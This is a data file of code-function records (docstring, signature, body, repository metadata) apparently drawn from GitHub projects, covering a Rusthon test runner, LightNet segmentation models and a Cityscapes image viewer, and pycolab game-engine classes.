{"docstring": "\"\"\"Returns the number of problems\"\"\"\n", "func_signal": "def run_command(command, returns_stdout_stderr=False, nodewebkit_workaround=False):\n", "code": "if os.path.isfile(\"%s.errors\" % tmpname):\n    os.unlink(\"%s.errors\" % tmpname)\nf = os.popen(command + \" 2>%s.errors\" % tmpname,  'r')\n\nkilled = False\ntry:\n    stdout = f.read().strip()\nexcept KeyboardInterrupt:\n    stdout = f.read().strip()\n    killed = True\n\nf.close()\n\n\nstderr = read(\"%s.errors\" % tmpname)\n\n\nif nodewebkit_workaround:\n    stdout = stderr\n    stderr = ''\n    a = []\n    for line in stdout.splitlines():\n        if 'INFO:CONSOLE' in line:\n            line = line.replace('\\\\n', '\\n')\n            line = line.replace('\\\\u003C', '<')\n            start = line.index('\"')\n            end = line.rindex('\"')\n            a.append( line[start+1:end] )\n    stdout = '\\n'.join(a)\n\n\nif stderr:\n    if show_details:\n        print('TEST ERROR!')\n        print(stderr)\n\nif killed:\n    print(stdout)\n    sys.exit()\n\nif returns_stdout_stderr:\n    return stdout, stderr\n\n#########################\n\nif show_details and stdout:\n    print(stdout)\n\nunknown = []\nfor line in stdout.splitlines():\n    if _benchmark:\n        if line.startswith('#'):\n            _benchmark.append( line )\n        else:\n            #exe = command.split()[0]\n            _benchmark.append( _test_description + ' ' + line )\n    else:\n        unknown.append(line)\nerrors = '\\n'.join(unknown) + stderr\n        \nd = {}\nx = errors.count(\"Error fail\")\nif x:\n    d['Error'] = x\nx = errors.count(\"Warning fail\")\nif x:\n    d['Warning'] = x\nif len(d) == 0 and errors != '':\n    if '.py\", line' in errors:\n        d[\"Syntax Error Python\"] = 1\n    else:\n        d[\"?\"] = 1\n\nreturn d", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "\"\"\"run one test and returns the number of errors\"\"\"\n", "func_signal": "def run_test_on(filename):\n", "code": "if not show_details:\n    f = open(filename)\n    comment = f.readline().strip(\" \\n\\\"'\")\n    f.close()\n    print(table_header % (filename[2:-3], comment), end='')\nsum_errors = {}\n\nif filename.endswith('.html'):\n    run_html_test( filename, sum_errors )\n    return sum_errors\n\ndef display(function):\n    global _test_description\n    _test_description = function.__doc__\n    if show_details:\n        print('\\n<%s>\\n' % function.__doc__)\n\n    errors = function(filename)\n    if errors:\n        if not show_details:\n            print(table_cell % ''.join('%s%d' % (k[0], v)\n                                        for k, v in errors.items()),\n                  end='')\n    else:\n        if not show_details:\n            print(table_cell % 'OK', end='')\n    sys.stdout.flush()\n\n    for k, v in errors.items():\n        sum_errors[k] = sum_errors.get(k, 0) + v\n\n    if show_details:\n        print('-'*77)\n\nif 'requirejs' not in filename and not filename.startswith('./go/'):\n    display(run_python_test_on)\n    display(run_python3_test_on)\n    if pypy_runnable:\n        display(run_pypy_test_on)\n    if old_pypy_runnable:\n        display(run_old_pypy_test_on)\n\nglobal js\ndo_js_test = not filename.startswith( ('./go/', './asm/', './rust/', './c++') )\nif do_js_test:\n    js = translate_js(\n        filename,\n        javascript=True,\n        multioutput=filename.startswith('./threads/' or filename.startswith('./bench/webworker'))\n    )\n    if rhino_runnable:\n        display(run_pythonjs_test_on)\n    if node_runnable:\n        display(run_pythonjs_test_on_node)\n\n    if nodewebkit_runnable:\n        display(run_pythonjs_test_on_nodewebkit)\n\n## TODO more optimized js settings pythonjs-minimal.js ##\n#if '--no-javascript-mode' not in sys.argv and do_js_test:\n#    js = translate_js(filename, javascript=True, multioutput=filename.startswith('./threads/' or filename.startswith('./bench/webworker')))\n#    if rhino_runnable:\n#        display(run_pythonjsjs_test_on)\n#    if node_runnable:\n#        display(run_pythonjsjs_test_on_node)\n#    if nodewebkit_runnable:\n#        display(run_pythonjsjs_test_on_nodewebkit)\n\n\nif 'requirejs' not in filename:\n\n    if dart_runnable:\n        js = translate_js(filename, javascript=False, dart=True)\n        display(run_pythonjs_dart_test_on_dart)\n\n    if dart2js_runnable and node_runnable:\n        js = translate_js(filename, javascript=False, dart=True)\n        display(run_pythonjs_dart_test_on_node)\n\n    if coffee_runnable and node_runnable:\n        js = translate_js(filename, javascript=False, dart=False, coffee=True)\n        display(run_pythonjs_coffee_test_on_node)\n\n    if luajs_runnable and node_runnable:\n        js = translate_js(filename, luajs=True)\n        display(run_pythonjs_luajs_test_on_node)\n\n    if lua_runnable:\n        js = translate_js(filename, lua=True)\n        display(run_pythonjs_lua_test_on_lua)\n\n    if luajit_runnable:\n        js = translate_js(filename, lua=True)\n        display(run_pythonjs_lua_test_on_luajit)\n\n    if go_runnable:\n        js = translate_js(filename, go=True)\n        display(run_pythonjs_go_test)\n\n    if gopherjs_runnable:\n        js = translate_js(filename, gopherjs=True)\n        display(run_pythonjs_gopherjs_test)\n\n    if rust_runnable:\n        js = translate_js(filename, rust=True)\n        display(run_pythonjs_rust_test)\n\n    if cpp_runnable:\n        js = translate_js(filename, cpp=True)\n        display(run_pythonjs_cpp_test)\n\n\nprint()\nreturn sum_errors", "path": "regtests\\run.py", "repo_name": "rusthon/Rusthon", "stars": 891, "license": "other", "language": "python", "size": 9308}
{"docstring": "# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++ #\n# 1. Encoder: feature extraction\n# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++ #\n", "func_signal": "def forward(self, x):\n", "code": "stg1 = self.mod1(x)     # (N, 32,   224, 448)  1/2\nstg1 = self.mod2(stg1)  # (N, 16,   224, 448)  1/2 -> 1/4 -> 1/8\nstg2 = self.mod3(stg1)  # (N, 24,   112, 224)  1/4 -> 1/8\nstg3 = self.mod4(stg2)  # (N, 32,   56,  112)  1/8\nstg4 = self.mod5(stg3)  # (N, 64,   56,  112)  1/8 dilation=2\nstg5 = self.mod6(stg4)  # (N, 96,   56,  112)  1/8 dilation=4\nstg6 = self.mod7(stg5)  # (N, 160,  56,  112)  1/8 dilation=8\nstg7 = self.mod8(stg6)  # (N, 320,  56,  112)  1/8 dilation=16\n\nstg1_1 = F.max_pool2d(input=stg1, kernel_size=3, stride=2, padding=1)    # 1/4\nstg1_2 = F.max_pool2d(input=stg1_1, kernel_size=3, stride=2, padding=1)  # 1/8\nstg2_1 = F.max_pool2d(input=stg2, kernel_size=3, stride=2, padding=1)    # 1/8\n\n# (N, 712, 56,  112)  1/8  (16+24+32+64+96+160+320)\nstg8 = self.out_se(torch.cat([stg3, stg4, stg5, stg6, stg7, stg1_2, stg2_1], dim=1))\n# stg8 = torch.cat([stg3, stg4, stg5, stg6, stg7, stg1_2, stg2_1], dim=1)\n\n# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++ #\n# 2. Decoder: multi-scale feature fusion\n# ++++++++++++++++++++++++++++++++++++++++++++++++++++++++ #\nif self.n_class != 0:\n    # (N, 672, H/8, W/8) -> (N, 256, H/4, W/4)\n    de_stg1 = self.sdaspp(stg8)\n\n    # (N, 256+24+16=296, H/4, W/4)\n    de_stg1 = self.score_se(torch.cat([de_stg1, stg2, stg1_1], dim=1))\n\n    # ++++++++++++++++++++++++++++++++++++++++++++++++++++++++ #\n    # 3. Classifier: pixel-wise classification-segmentation\n    # ++++++++++++++++++++++++++++++++++++++++++++++++++++++++ #\n    net_out = self.score(de_stg1)\n\n    return net_out\nelse:\n    return stg8", "path": "models\\mobilenetv2aspp.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "\"\"\"\n    Processes image for CNNs\n\nArgs:\n    PIL_img (PIL_img): Image to process\n    resize_im (bool): Resize to 224 or not\nreturns:\n    im_as_var (Pytorch variable): Variable that contains processed float tensor\n\"\"\"\n# mean and std list for channels (Imagenet)\n", "func_signal": "def preprocess_image(cv2im, resize_im=True):\n", "code": "mean = [0.485, 0.456, 0.406]\nstd = [0.229, 0.224, 0.225]\n# Resize image\nif resize_im:\n    cv2im = cv2.resize(cv2im, (224, 224))\nim_as_arr = np.float32(cv2im)\nim_as_arr = np.ascontiguousarray(im_as_arr[..., ::-1])\nim_as_arr = im_as_arr.transpose(2, 0, 1)  # Convert array to D,W,H\n# Normalize the channels\nfor channel, _ in enumerate(im_as_arr):\n    im_as_arr[channel] /= 255\n    im_as_arr[channel] -= mean[channel]\n    im_as_arr[channel] /= std[channel]\n# Convert to float tensor\nim_as_ten = torch.from_numpy(im_as_arr).float()\n# Add one more channel to the beginning. Tensor shape = 1,3,224,224\nim_as_ten.unsqueeze_(0)\n# Convert to Pytorch variable\nim_as_var = Variable(im_as_ten, requires_grad=True)\nreturn im_as_var", "path": "net_viz\\misc.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "# x: input features with shape [N,C,H,W]\n# gamma, beta: scale and offset, with shape [1,C,1,1]\n# G: number of groups for GN\n", "func_signal": "def tf_group_norm(x, gamma, beta, groups, eps=1e-5):\n", "code": "batch_size, num_channels, height, width = x.shape\nchannels_per_group = num_channels // groups\nx = tf.reshape(x, [batch_size, groups, channels_per_group, height, width])\nmean, var = tf.nn.moments(x, axes=[2, 3, 4], keep_dims=True)\nx = (x - mean) / tf.sqrt(var + eps)\nx = tf.reshape(x, [batch_size, num_channels, height, width])\nreturn x * gamma + beta", "path": "modules\\group_norm.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "# Zoom disabled?\n", "func_signal": "def drawZoom(self,qp,overlay):\n", "code": "if not self.zoom:\n    return\n# No image\nif self.image.isNull() or not self.w or not self.h:\n    return\n# No mouse\nif not self.mousePosOrig:\n    return\n\n# Abbrevation for the zoom window size\nzoomSize = self.zoomSize\n# Abbrevation for the mouse position\nmouse = self.mousePosOrig\n\n# The pixel that is the zoom center\npix = self.mousePosScaled\n# The size of the part of the image that is drawn in the zoom window\nselSize = zoomSize / ( self.zoomFactor * self.zoomFactor )\n# The selection window for the image\nsel  = QtCore.QRectF(pix.x()  -selSize/2 ,pix.y()  -selSize/2 ,selSize,selSize  )\n# The selection window for the widget\nview = QtCore.QRectF(mouse.x()-zoomSize/2,mouse.y()-zoomSize/2,zoomSize,zoomSize)\nif overlay :\n    overlay_scaled = overlay.scaled(self.image.width(), self.image.height())\nelse :\n    overlay_scaled = QtGui.QImage( self.image.width(), self.image.height(), QtGui.QImage.Format_ARGB32_Premultiplied )\n\n# Show the zoom image\nqp.save()\nqp.drawImage(view,self.image,sel)\nqp.setOpacity(self.transp)\nqp.drawImage(view,overlay_scaled,sel)\nqp.restore()", "path": "datasets\\cityscapesscripts\\viewer\\cityscapesViewer.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "# Create a QPainter that can perform draw actions within a widget or image\n", "func_signal": "def paintEvent(self, event):\n", "code": "qp = QtGui.QPainter()\n# Begin drawing in the application widget\nqp.begin(self)\n# Update scale\nself.updateScale(qp)\n# Determine the object ID to highlight\nself.getHighlightedObject(qp)\n# Draw the image first\nself.drawImage(qp)\n\nif self.enableDisparity and self.showDisparity:\n    # Draw the disparities on top\n    overlay = self.drawDisp(qp)\nelse:\n    # Draw the labels on top\n    overlay = self.drawLabels(qp)\n    # Draw the label name next to the mouse\n    self.drawLabelAtMouse(qp)\n\n# Draw the zoom\nself.drawZoom(qp, overlay)\n\n# Thats all drawing\nqp.end()\n\n# Forward the paint event\nQtGui.QMainWindow.paintEvent(self,event)", "path": "datasets\\cityscapesscripts\\viewer\\cityscapesViewer.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "# This variable we want to fill\n", "func_signal": "def getHighlightedObject(self, qp):\n", "code": "self.highlightObj = None\n\n# Without labels we cannot do so\nif not self.annotation:\n    return\n\n# If available its the selected object\nhighlightObjId = -1\n# If not available but the polygon is empty or closed, its the mouse object\nif highlightObjId < 0 and not self.mouseOutsideImage:\n    highlightObjId = self.mouseObj\n# Get the actual object that is highlighted\nif highlightObjId >= 0:\n    self.highlightObj = self.annotation.objects[highlightObjId]\n    self.highlightObjLabel = self.annotation.objects[highlightObjId].label", "path": "datasets\\cityscapesscripts\\viewer\\cityscapesViewer.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "\"\"\"\n    Exports the original gradient image\n\nArgs:\n    gradient (np arr): Numpy array of the gradient with shape (3, 224, 224)\n    file_name (str): File name to be exported\n\"\"\"\n", "func_signal": "def save_gradient_images(gradient, file_name):\n", "code": "if not os.path.exists('../results'):\n    os.makedirs('../results')\ngradient = gradient - gradient.min()\ngradient /= gradient.max()\ngradient = np.uint8(gradient * 255).transpose(1, 2, 0)\npath_to_file = os.path.join('../results', file_name + '.jpg')\n# Convert RBG to GBR\ngradient = gradient[..., ::-1]\ncv2.imwrite(path_to_file, gradient)", "path": "net_viz\\misc.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "# Nothing to do without a highlighted object\n", "func_signal": "def drawLabelAtMouse(self, qp):\n", "code": "if not self.highlightObj:\n    return\n# Nothing to without a mouse position\nif not self.mousePosOrig:\n    return\n\n# Save QPainter settings to stack\nqp.save()\n\n# That is the mouse positiong\nmouse = self.mousePosOrig\n\n# Will show zoom\nshowZoom = self.zoom and not self.image.isNull() and self.w and self.h\n\n# The text that is written next to the mouse\nmouseText = self.highlightObj.label\n\n# Where to write the text\n# Depends on the zoom (additional offset to mouse to make space for zoom?)\n# The location in the image (if we are at the top we want to write below of the mouse)\noff = 36\nif showZoom:\n    off += self.zoomSize/2\nif mouse.y()-off > self.toolbar.height():\n    top = mouse.y()-off\n    btm = mouse.y()\n    vAlign = QtCore.Qt.AlignTop\nelse:\n    # The height of the cursor\n    if not showZoom:\n        off += 20\n    top = mouse.y()\n    btm = mouse.y()+off\n    vAlign = QtCore.Qt.AlignBottom\n\n# Here we can draw\nrect = QtCore.QRect()\nrect.setTopLeft(QtCore.QPoint(mouse.x()-200,top))\nrect.setBottomRight(QtCore.QPoint(mouse.x()+200,btm))\n\n# The color\nqp.setPen(QtGui.QColor('white'))\n# The font to use\nfont = QtGui.QFont(\"Helvetica\",20,QtGui.QFont.Bold)\nqp.setFont(font)\n# Non-transparent\nqp.setOpacity(1)\n# Draw the text, horizontally centered\nqp.drawText(rect,QtCore.Qt.AlignHCenter|vAlign,mouseText)\n# Restore settings\nqp.restore()", "path": "datasets\\cityscapesscripts\\viewer\\cityscapesViewer.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "# And we need to have a directory where disparities should be searched\n", "func_signal": "def getDisparityFilename( self ):\n", "code": "if not self.dispPath:\n    return \"\"\n# Without the name of the current images, there is also nothing we can do\nif not self.currentFile:\n    return \"\"\n# Check if the label directory is valid.\nif not os.path.isdir(self.dispPath):\n    return \"\"\n\n# Generate the filename of the label file\nfilename = os.path.basename( self.currentFile )\nfilename = filename.replace( self.imageExt , self.dispExt )\nfilename = os.path.join( self.dispPath , filename )\nfilename = os.path.normpath(filename)\nreturn filename", "path": "datasets\\cityscapesscripts\\viewer\\cityscapesViewer.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "# x: input features with shape [N, C, H, W]\n# weight, bias: scale and offset, with shape [1, C, 1, 1]\n# groups: number of groups for GroupNorm\n\n", "func_signal": "def forward(self, x):\n", "code": "batch_size, num_channels, height, width = x.size()\nassert num_channels % self.num_groups == 0\n\nx = x.view(batch_size, self.num_groups, -1)\nmean = x.mean(dim=-1, keepdim=True)\nvar = x.var(dim=-1, keepdim=True)\n\nx = (x-mean) / (var+self.eps).sqrt()\nx = x.view(batch_size, num_channels, height, width)\nreturn x * self.weight + self.bias", "path": "modules\\group_norm.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "\"\"\"\n    Channel shuffle operation\n    :param x: input tensor\n    :param groups: split channels into groups\n    :return: channel shuffled tensor\n\"\"\"\n", "func_signal": "def _channel_shuffle(x, groups):\n", "code": "batch_size, num_channels, height, width = x.data.size()\nchannels_per_group = num_channels // groups\n\n# reshape\nx = x.view(batch_size, groups, channels_per_group, height, width)\n\n# transpose\n# - contiguous() required if transpose() is used before view().\n#   See https://github.com/pytorch/pytorch/issues/764\nx = torch.transpose(x, 1, 2).contiguous().view(batch_size, -1, height, width)\n\nreturn x", "path": "models\\mobilenetv2aspp.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "# Load the first image\n", "func_signal": "def imageChanged(self):\n", "code": "self.loadImage()\n# Load its labels if available\nself.loadLabels()\n# Load disparities if available\nself.loadDisparities()\n# Update the object the mouse points to\nself.updateMouseObject()\n# Update the GUI\nself.update()", "path": "datasets\\cityscapesscripts\\viewer\\cityscapesViewer.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "# Return if no image available\n", "func_signal": "def drawImage(self, qp):\n", "code": "if self.image.isNull():\n    return\n\n# Save the painters current setting to a stack\nqp.save()\n# Draw the image\nqp.drawImage(QtCore.QRect( self.xoff, self.yoff, self.w, self.h ), self.image)\n# Restore the saved setting from the stack\nqp.restore()", "path": "datasets\\cityscapesscripts\\viewer\\cityscapesViewer.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "# Where to look for Cityscapes\n", "func_signal": "def main():\n", "code": "if 'CITYSCAPES_DATASET' in os.environ:\n    cityscapesPath = os.environ['CITYSCAPES_DATASET']\nelse:\n    cityscapesPath = os.path.join(os.path.dirname(os.path.realpath(__file__)),'..','..')\n# how to search for all ground truth\nsearchFine   = os.path.join( cityscapesPath , \"gtFine\"   , \"*\" , \"*\" , \"*_gt*_polygons.json\" )\nsearchCoarse = os.path.join( cityscapesPath , \"gtCoarse\" , \"*\" , \"*\" , \"*_gt*_polygons.json\" )\n\n# search files\nfilesFine = glob.glob( searchFine )\nfilesFine.sort()\nfilesCoarse = glob.glob( searchCoarse )\nfilesCoarse.sort()\n\n# concatenate fine and coarse\nfiles = filesFine + filesCoarse\n# files = filesFine # use this line if fine is enough for now.\n\n# quit if we did not find anything\nif not files:\n    printError( \"Did not find any files. Please consult the README.\" )\n\n# a bit verbose\nprint(\"Processing {} annotation files\".format(len(files)))\n\n# iterate through files\nprogress = 0\nprint(\"Progress: {:>3} %\".format( progress * 100 / len(files) ), end=' ')\nfor f in files:\n    # create the output filename\n    dst = f.replace( \"_polygons.json\" , \"_labelTrainIds.png\" )\n\n    # do the conversion\n    try:\n        json2labelImg( f , dst , \"trainIds\" )\n    except:\n        print(\"Failed to convert: {}\".format(f))\n        raise\n\n    # status\n    progress += 1\n    print(\"\\rProgress: {:>3} %\".format( progress * 100 / len(files) ), end=' ')\n    sys.stdout.flush()", "path": "datasets\\cityscapesscripts\\preparation\\createTrainIdLabelImgs.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "\"\"\"\n    Converts 3d image to grayscale\n\nArgs:\n    cv2im (numpy arr): RGB image with shape (D,W,H)\n\nreturns:\n    grayscale_im (numpy_arr): Grayscale image with shape (1,W,D)\n\"\"\"\n", "func_signal": "def convert_to_grayscale(cv2im):\n", "code": "grayscale_im = np.sum(np.abs(cv2im), axis=0)\nim_max = np.percentile(grayscale_im, 99)\nim_min = np.min(grayscale_im)\ngrayscale_im = (np.clip((grayscale_im - im_min) / (im_max - im_min), 0, 1))\ngrayscale_im = np.expand_dims(grayscale_im, axis=0)\nreturn grayscale_im", "path": "net_viz\\misc.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "\"\"\"\n    Recreates images from a torch variable, sort of reverse preprocessing\n\nArgs:\n    im_as_var (torch variable): Image to recreate\n\nreturns:\n    recreated_im (numpy arr): Recreated image in array\n\"\"\"\n", "func_signal": "def recreate_image(im_as_var):\n", "code": "reverse_mean = [-0.485, -0.456, -0.406]\nreverse_std = [1/0.229, 1/0.224, 1/0.225]\nrecreated_im = copy.copy(im_as_var.data.numpy()[0])\nfor c in range(3):\n    recreated_im[c] /= reverse_std[c]\n    recreated_im[c] -= reverse_mean[c]\nrecreated_im[recreated_im > 1] = 1\nrecreated_im[recreated_im < 0] = 0\nrecreated_im = np.round(recreated_im * 255)\n\nrecreated_im = np.uint8(recreated_im).transpose(1, 2, 0)\n# Convert RBG to GBR\nrecreated_im = recreated_im[..., ::-1]\nreturn recreated_im", "path": "net_viz\\misc.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "\"\"\"\n    Channel shuffle operation\n    :param x: input tensor\n    :param groups: split channels into groups\n    :return: channel shuffled tensor\n\"\"\"\n", "func_signal": "def _channel_shuffle(x, groups):\n", "code": "batch_size, num_channels, height, width = x.data.size()\nchannels_per_group = num_channels // groups\n\n# reshape\nx = x.view(batch_size, groups, channels_per_group, height, width)\n\n# transpose\n# - contiguous() required if transpose() is used before view().\n#   See https://github.com/pytorch/pytorch/issues/764\nx = torch.transpose(x, 1, 2).contiguous().view(batch_size, -1, height, width)\n\nreturn x", "path": "models\\mobilenetv2share.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "# Reset the status bar to this message when leaving\n", "func_signal": "def getCityFromUser(self):\n", "code": "restoreMessage = self.statusBar().currentMessage()\n\nif 'CITYSCAPES_DATASET' in os.environ:\n    csPath = os.environ['CITYSCAPES_DATASET']\nelse:\n    csPath = os.path.join(os.path.dirname(os.path.realpath(__file__)),'..','..')\n\navailableCities = []\nannotations = [ \"gtFine\" , \"gtCoarse\" ]\nsplits      = [ \"train_extra\" , \"train\"  , \"val\" , \"test\" ]\nfor gt in annotations:\n    for split in splits:\n        cities = glob.glob(os.path.join(csPath, gt, split, '*'))\n        cities.sort()\n        availableCities.extend( [ (split,gt,os.path.basename(c)) for c in cities if os.listdir(c) ] )\n\n# List of possible labels\nitems = [split + \", \" + gt + \", \" + city for (split,gt,city) in availableCities]\n\n# Specify title\ndlgTitle = \"Select new city\"\nmessage = dlgTitle\nquestion = dlgTitle\nmessage = \"Select city for viewing\"\nquestion = \"Which city would you like to view?\"\nself.statusBar().showMessage(message)\n\nif items:\n    # Create and wait for dialog\n    (item, ok) = QtGui.QInputDialog.getItem(self, dlgTitle, question,\n                                            items, 0, False)\n\n    # Restore message\n    self.statusBar().showMessage(restoreMessage)\n\n    if ok and item:\n        (split, gt, city) = [str(i) for i in item.split(', ')]\n        if split == 'test' and not self.showDisparity:\n            self.transp = 0.1\n        else:\n            self.transp = 0.5\n        self.city      = os.path.normpath(os.path.join(csPath, \"leftImg8bit\", split, city))\n        self.labelPath = os.path.normpath(os.path.join(csPath, gt           , split, city))\n        self.dispPath  = os.path.normpath(os.path.join(csPath, \"disparity\"  , split, city))\n        self.loadCity()\n        self.imageChanged()\n\nelse:\n\n    warning = \"\"\n    warning += \"The data was not found. Please:\\n\\n\"\n    warning += \" - make sure the scripts folder is in the Cityscapes root folder\\n\"\n    warning += \"or\\n\"\n    warning += \" - set CITYSCAPES_DATASET to the Cityscapes root folder\\n\"\n    warning += \"       e.g. 'export CITYSCAPES_DATASET=<root_path>'\\n\"\n\n    reply = QtGui.QMessageBox.information(self, \"ERROR!\", warning,\n                                          QtGui.QMessageBox.Ok)\n    if reply == QtGui.QMessageBox.Ok:\n        sys.exit()\n\nreturn", "path": "datasets\\cityscapesscripts\\viewer\\cityscapesViewer.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "# Search for all *.pngs to get the image list\n", "func_signal": "def loadCity(self):\n", "code": "self.images = []\nif os.path.isdir(self.city):\n    self.images = glob.glob( os.path.join( self.city , '*' + self.imageExt ) )\n    self.images.sort()\n    if self.currentFile in self.images:\n        self.idx = self.images.index(self.currentFile)\n    else:\n        self.idx = 0", "path": "datasets\\cityscapesscripts\\viewer\\cityscapesViewer.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "\"\"\"\n\n:param num_features:\n:param num_groups:\n:param eps:\n\"\"\"\n", "func_signal": "def __init__(self, num_features, num_groups=32, eps=1e-5):\n", "code": "super(GroupNorm2D, self).__init__()\nself.weight = nn.Parameter(torch.ones(1, num_features, 1, 1))\nself.bias = nn.Parameter(torch.zeros(1, num_features, 1, 1))\nself.num_groups = num_groups\nself.eps = eps", "path": "modules\\group_norm.py", "repo_name": "linksense/LightNet", "stars": 715, "license": "mit", "language": "python", "size": 91934}
{"docstring": "\"\"\"Construct a `Backdrop`.\n\nWhatever arguments your `Backdrop` subclass takes, its first two should be\nthe same `curtain` and `palette` arguments taken here.\n\nUnless you really know what you're doing, your `Backdrop` subclass should\nbe certain to call this `__init__` method before doing anything else in its\nown constructor. Here's example code to copy and paste:\n\n    super(MyCoolBackdrop, self).__init__(curtain, palette)\n\nArgs:\n  curtain: A 2-D numpy array with dtype `uint8`, which will be \"owned\" by\n      this `Backdrop` and made accessible at `self.curtain`. Values in this\n      array will be painted onto the game board first at each gameplay\n      iteration. Subclasses of `Backdrop` will update the backdrop by\n      changing the data inside `self.curtain`. May already have items in\n      it before it gets received by `__init__` (for example, it may have\n      been populated from an ASCII-art diagram).\n  palette: A handy mapping from characters to the corresponding `uint8`\n      values that you should use to update `self.curtain`. Characters that\n      are legal Python names can be accessed using property notation, (e.g.\n      `self.palette.M`); for others, you'll need to do dict-style lookups\n      (e.g. `self.palette['~']`). (A few characters have special property\n      names -- for example, `self.palette.space` is sugar for\n      `self.palette[' ']`. See `Palette` docs for details.) This mapping\n      will be \"owned\" by this `Backdrop` and made accessible at\n      `self.palette`, but you may wish to abbreviate it in your methods\n      (`p = self.palette`). Finally, note that if a character appears not\n      to exist as a property or dict entry in the palette, it's not legal\n      for you to use. (No peeking at an ASCII chart to get around this!)\n\"\"\"\n# Direct access is highly discouraged. Use the properties instead.\n", "func_signal": "def __init__(self, curtain, palette):\n", "code": "self._c_u_r_t_a_i_n = curtain\nself._p_a_l_e_t_t_e = palette", "path": "pycolab\\things.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Constructor: list impassables, initialise direction.\"\"\"\n", "func_signal": "def __init__(self, corner, position, character):\n", "code": "super(PatrollerSprite, self).__init__(\n    corner, position, character, impassable='#')\n# Choose our initial direction based on our character value.\nself._moving_east = bool(ord(character) % 2)", "path": "pycolab\\examples\\better_scrolly_maze.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Raise Error if `entity` is in a different scrolling group than the arg.\n\nThis function also handles all aspects of managing the registry that maps\npycolab entities to scrolling groups.\n\nArgs:\n  entity: the pycolab game entity against whose scrolling group affiliation\n      we are going to compare `scrolling_group`.\n  the_plot: the pycolab game's `Plot` object.\n  scrolling_group: a string identifier for the scrolling group to which we are\n      making certain `entity` belongs.\n\nRaises:\n  TypeError: `entity` is not a pycolab entity.\n  Error: `entity` is known to belong to a scrolling group distinct from\n      `scrolling_group`.\n\"\"\"\n# We could make this a decorator, but then we'd have to go to some trouble\n# to handle default arguments.\n\n", "func_signal": "def _check_scrolling_group(entity, the_plot, scrolling_group):\n", "code": "if not isinstance(entity, (things.Backdrop, things.Drape, things.Sprite)):\n  raise TypeError('an object that was not a pycolab game entity ({}) '\n                  'attempted to use the scrolling protocol.'.format(entity))\n\nscrolling_groups = the_plot.setdefault('scrolling_everyone', {})\nlast_scrolling_group = scrolling_groups.setdefault(entity, scrolling_group)\nif scrolling_group != last_scrolling_group:\n  raise Error('{} has attempted to participate in the scrolling protocol as '\n              'part of scrolling group {}, but is already known to belong to '\n              'scrolling group {}.'.format(\n                  _entity_string_for_errors(entity),\n                  repr(scrolling_group), repr(last_scrolling_group)))", "path": "pycolab\\protocols\\scrolling.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
{"docstring": "\"\"\"Construct a `Drape`.\n\nWhatever arguments your `Drape` subclass takes, its first two should be the\nsame `curtain` and `character` arguments taken here.\n\nUnless you really know what you're doing, your `Drape` subclass should be\ncertain to call this `__init__` method before doing anything else in its own\nconstructor. Here's example code to copy and paste:\n\n    super(MyCoolDrape, self).__init__(curtain, character)\n\nA `Drape` object that does not wish to be visible after construction should\nhave its constructor assign `self._visible = False` after calling its\nsuperclass constructor.\n\nArgs:\n  curtain: A 2-D numpy array with dtype `bool_`, which will be \"owned\" by\n      this `Drape` and made accessible at `self.curtain`. Values in this\n      array will be used as a mask for painting `character` onto the\n      game board, at whatever time is dictated by this game's `Engine`'s\n      z-ordering. Subclasses of `Drape` will update the mask by changing\n      the data inside `self.curtain`.\n  character: The character that this `Drape` paints onto the board.\n      Subclasses will not paint this character directly; it's here for\n      the object's reference when examining the arguments to `update`.\n\"\"\"\n# Direct access is highly discouraged. Use the properties instead.\n", "func_signal": "def __init__(self, curtain, character):\n", "code": "self._c_u_r_t_a_i_n = curtain\nself._c_h_a_r_a_c_t_e_r = character", "path": "pycolab\\things.py", "repo_name": "deepmind/pycolab", "stars": 654, "license": "apache-2.0", "language": "python", "size": 448}
